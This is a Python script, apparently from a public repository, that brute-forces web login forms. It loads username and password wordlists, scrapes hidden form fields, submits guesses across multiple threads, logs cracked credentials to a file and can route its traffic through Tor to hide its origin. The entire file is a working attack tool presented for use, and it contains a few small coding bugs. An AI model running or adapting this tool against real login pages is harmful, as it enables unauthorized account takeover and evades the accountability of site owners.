#!/usr/local/bin/python3
import threading
import queue
from html.parser import HTMLParser
import requests
import argparse
import socks
import socket
from argparse import RawTextHelpFormatter # for newline in description

### refer to README.md for usage and explanations

user_thread = 10
resume = None
target_url = None
target_post = None
username_field = "username"
password_field = "password"
error_check = "Wrong username and password"


def copy_of_queue(old_queue):
	new_queue = queue.Queue()
	for i in old_queue.queue:
		new_queue.put(i)

	return new_queue

def build_wordlist(wordlist_file):
	# read in the word list
	fd = open(wordlist_file,"r")
	raw_words = fd.readlines()
	fd.close()

	found_resume = False
	words = queue.Queue()

	for word in raw_words:
		word = word.rstrip()

		if resume is not None:
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print("Resuming wordlist from: %s" % resume)
		else:
			words.put(word)

	return words

class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value

			if tag_name is not None:
				self.tag_results[tag_name] = value 

class Bruter(object):
	def __init__(self, username, words, output):
		self.username = username
		self.password_q = words
		self.found = False
		self.output = output
		print("Finished setting up for: %s" % username)

	def run_bruteforce(self):
		ret = [threading.Thread(target=self.web_bruter) for _ in range(user_thread)]
		for t in ret: t.start()

		return ret

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			response = requests.get(target_url)

			with requests.Session() as session:
				print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
				response = session.get(target_url)

				page = response.text
				# parse out the hidden fields
				parser = BruteParser()
				parser.feed(page)
				post_tags = parser.tag_results
				
				# add our username and password fields
				post_tags[username_field] = self.username
				post_tags[password_field] = brute

				session.headers.update({'referer': target_url})
				
				login_response = session.post(target_post, data=post_tags)

				login_result = login_response.text

				if error_check not in login_result:
					self.found = True
					wr = self.username + ':' + brute + '\n'
					if output: output.write(wr)
					print("FOUND %s" % brute)


if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='Example commands:\n\
	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt -e "password didn\'t match"\n\
	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --username-field user -e "password didn\'t match"\n\
	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --post <post_url> -e "password didn\'t match"\n', formatter_class=RawTextHelpFormatter, prog="./BruteForceForm.py")
	parser.add_argument("target_url", help="url of target")
	parser.add_argument("-u", "--usernames", help="file with usernames", required=True)
	parser.add_argument("-w", "--wordlist", help="file with passwords", required=True)
	parser.add_argument("-e", "--error-check", help="error check that should be not be present in response body upon success and present upon fail", required=True)
	parser.add_argument("-o", "--output", help="file where found matches will be stored")
	parser.add_argument("--post", metavar="post url", help="url to post form (defaults to target_url)")
	parser.add_argument("--username-field", help="name of username input field")
	parser.add_argument("--password-field", help="name of password input field")
	parser.add_argument("--tor", action="store_true", help="proxy the requests through tor")
	
	args = parser.parse_args()
	username_file = args.usernames
	wordlist_file = args.wordlist
	target_url = args.target_url
	error_check = args.error_check

	if args.tor:
		socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
		socket.socket = socks.socksocket

	if args.post:
		target_post = args.post_tags
	else:
		target_post = target_url

	if args.output:
		output_file = args.output
	else:
		output_file = None

	if args.username_field:
		username_field = args.username_field
	if args.password_field:
		password_field = args.password_field
	
	output = open(output_file, 'w') if output_file else None
	words = build_wordlist(wordlist_file)
	with open(username_file) as f:
		for username in f:
			bruter = Bruter(username.strip(" \n"), copy_of_queue(words), output)
			threads = bruter.run_bruteforce()
			for t in threads: t.join() # join all threads

	if output:
		output.close()